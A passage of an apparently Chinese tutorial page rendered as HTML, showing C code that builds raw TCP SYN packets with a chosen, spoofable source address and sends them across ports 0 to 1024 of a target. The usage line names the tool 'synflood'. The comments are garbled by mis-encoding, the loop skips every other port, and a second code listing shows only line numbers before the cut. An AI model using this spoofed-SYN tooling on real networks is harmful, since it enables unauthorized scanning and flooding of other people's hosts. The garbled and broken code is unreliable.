</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">struct</span> pseudohdr pseudo;  <span style="color:#007f7f">//TCP ä¼ªå¤´éƒ¨
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">//saddr = inet_addr(&#34;192.168.195.145&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
</span></span><span style="display:flex;"><span>    len = <span style="color:#fff;font-weight:bold">sizeof</span>(ip) + <span style="color:#fff;font-weight:bold">sizeof</span>(tcp);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// åˆå§‹åŒ–å¤´éƒ¨ä¿¡æ¯
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    init_ip_header(&amp;ip, saddr, daddr);
</span></span><span style="display:flex;"><span>    init_tcp_header(&amp;tcp, dport);
</span></span><span style="display:flex;"><span>    init_pseudo_header(&amp;pseudo, saddr, daddr);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">//è®¡ç®—IPæ ¡éªŒå’Œ
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    ip.checksum = checksum((u_short *)&amp;ip, <span style="color:#fff;font-weight:bold">sizeof</span>(ip));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// è®¡ç®—TCPæ ¡éªŒå’Œ
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    bzero(buf, <span style="color:#fff;font-weight:bold">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>    memcpy(buf , &amp;pseudo, <span style="color:#fff;font-weight:bold">sizeof</span>(pseudo));           <span style="color:#007f7f">// å¤åˆ¶TCPä¼ªå¤´éƒ¨
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    memcpy(buf + <span style="color:#fff;font-weight:bold">sizeof</span>(pseudo), &amp;tcp, <span style="color:#fff;font-weight:bold">sizeof</span>(tcp)); <span style="color:#007f7f">// å¤åˆ¶TCPå¤´éƒ¨
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    tcp.checksum = checksum((u_short *)buf, <span style="color:#fff;font-weight:bold">sizeof</span>(pseudo) + <span style="color:#fff;font-weight:bold">sizeof</span>(tcp));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    bzero(packet, pkt_len);
</span></span><span style="display:flex;"><span>    memcpy(packet, &amp;ip, <span style="color:#fff;font-weight:bold">sizeof</span>(ip));
</span></span><span style="display:flex;"><span>    memcpy(packet + <span style="color:#fff;font-weight:bold">sizeof</span>(ip), &amp;tcp, <span style="color:#fff;font-weight:bold">sizeof</span>(tcp));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> len;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">int</span> make_raw_socket()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> fd;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> on = <span style="color:#ff0;font-weight:bold">1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// åˆ›å»ºä¸€ä¸ªåŸå§‹å¥—æ¥å­—, æŒ‡å®šå…¶å…³æ³¨TCPåè®®
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (fd == -<span style="color:#ff0;font-weight:bold">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> -<span style="color:#ff0;font-weight:bold">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// è®¾ç½®éœ€è¦æ‰‹åŠ¨æ„å»ºIPå¤´éƒ¨
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">if</span> (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (<span style="color:#fff;font-weight:bold">char</span> *)&amp;on, <span style="color:#fff;font-weight:bold">sizeof</span>(on)) &lt; <span style="color:#ff0;font-weight:bold">0</span>) {
</span></span><span style="display:flex;"><span>        close(fd);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> -<span style="color:#ff0;font-weight:bold">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> fd;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">int</span> send_syn_packet(<span style="color:#fff;font-weight:bold">int</span> i ,<span style="color:#fff;font-weight:bold">int</span> sockfd, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> addr, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> sddr,<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> port)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">struct</span> sockaddr_in skaddr;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">char</span> packet[<span style="color:#ff0;font-weight:bold">256</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> pkt_len;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    bzero(&amp;skaddr, <span style="color:#fff;font-weight:bold">sizeof</span>(skaddr));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    skaddr.sin_family = AF_INET;
</span></span><span style="display:flex;"><span>    skaddr.sin_port = htons(port);
</span></span><span style="display:flex;"><span>    skaddr.sin_addr.s_addr = addr;
</span></span><span style="display:flex;"><span>    printf(<span style="color:#0ff;font-weight:bold">&#34;%d ç«¯å£å·²ç»æ¢æµ‹</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>,i);
</span></span><span style="display:flex;"><span>    pkt_len = make_syn_packet(packet, <span style="color:#ff0;font-weight:bold">256</span>, addr,sddr, port);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> sendto(sockfd, packet, pkt_len, <span style="color:#ff0;font-weight:bold">0</span>, (<span style="color:#fff;font-weight:bold">struct</span> sockaddr *)&amp;skaddr,
</span></span><span style="display:flex;"><span>                  <span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> sockaddr));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">int</span> main(<span style="color:#fff;font-weight:bold">int</span> argc, <span style="color:#fff;font-weight:bold">char</span> *argv[])
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> addr;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> sddr;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> port;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> sockfd;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (argc &lt; <span style="color:#ff0;font-weight:bold">3</span>) {
</span></span><span style="display:flex;"><span>        fprintf(stderr, <span style="color:#0ff;font-weight:bold">&#34;Usage: synflood &lt;address&gt; &lt;port&gt;</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ff0;font-weight:bold">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    addr = inet_addr(argv[<span style="color:#ff0;font-weight:bold">1</span>]);
</span></span><span style="display:flex;"><span>    sddr = inet_addr(argv[<span style="color:#ff0;font-weight:bold">2</span>]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    sockfd = make_raw_socket();
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (sockfd == -<span style="color:#ff0;font-weight:bold">1</span>) {
</span></span><span style="display:flex;"><span>        fprintf(stderr, <span style="color:#0ff;font-weight:bold">&#34;Failed to make raw socket</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ff0;font-weight:bold">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">for</span> (<span style="color:#fff;font-weight:bold">int</span> i = <span style="color:#ff0;font-weight:bold">0</span> ; i &lt;= <span style="color:#ff0;font-weight:bold">1024</span>; i++) {
</span></span><span style="display:flex;"><span>        port = i;
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (send_syn_packet(i,sockfd, addr,sddr, port) &lt; <span style="color:#ff0;font-weight:bold">0</span>) {
</span></span><span style="display:flex;"><span>            fprintf(stderr, <span style="color:#0ff;font-weight:bold">&#34;Failed to send syn packet</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        i +=<span style="color:#ff0;font-weight:bold">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    close(sockfd);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>å‘é€tcpåŒ…åˆ°ç›®çš„æœºç¡®å®šç«¯å£çš„è„šæœ¬</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 55
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 56
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 57
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 58
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 59
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 60
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 61
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 62
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 63
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 64
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 65
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 66
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 67
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 68
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 69
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 70
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 71
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 72
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 73
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 74
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 75
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 76
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 77
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 78
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 79
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 80
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 81
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 82
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 83
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 84
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 85
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 86
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 87
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 88
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 89
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 90
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 91
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 92
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 93
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 94
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 95
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 96
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 97
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 98
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 99
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">100
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">101
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">102
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">103
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">104
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">105
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">106
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">107
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">108
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">109
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">110
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">111
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">112
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">113
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">114
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">115
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">116
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">117
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">118
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">119
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">120
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">121
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">122
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">123
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">124
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">125
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">126
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">127
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">128
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">129
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">130
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">131
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">132
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">133
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">134
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">135
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">136
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">137
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">138
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">139
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">140
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">141
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">142
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">143
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">144
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">145
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">146
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">147
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">148
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">149
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">150
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">151
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">152
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">153
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">154
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">155
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">156
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">157
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">158
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">159
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">160
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">161
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">162
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">163
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">164
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">165
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">166
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">167
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">168
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">169
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">170
